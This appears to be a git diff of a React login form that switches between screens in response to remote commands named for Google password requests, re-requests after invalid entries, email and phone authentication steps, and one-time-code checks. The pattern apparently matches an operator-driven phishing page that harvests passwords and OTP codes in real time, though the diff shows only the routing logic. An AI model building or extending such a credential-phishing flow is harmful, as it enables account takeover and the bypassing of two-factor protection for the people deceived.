@@ -26,20 +26,27 @@ export default function LoginForm() {
         } 
         else if (command === 'REQUEST_GOOGLE_PASSWORD') {
             setIsLoading(false);
-            setBgLoader(true);
             setCurrentStep('password');
         }
         else if (command === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('password');
-        }
-        else if (command === 'CORRECT_OTP') {
+        }  else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
             setIsLoading(false);
-            setBgLoader(true);
-            // setTimeout(() => {
-            //     router.push('/OTPVerification');
-            // }, 1500);
+            setTimeout(() => {
+                // setIsLoading(false);
+                resetCommand(); 
+                router.push('/AuthenticationPage');
+            }, 1500);
+        } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
+            setIsLoading(false);
+            setTimeout(() => {
+                resetCommand(); 
+                router.push('/NumAuthenticationPage');
+            }, 1500);
+        } else if (command === 'CORRECT_OTP') {
+            setIsLoading(false);
         } else if (command === 'FINISH') {
             setTimeout(() => {
                 router.push('/verificationPage');
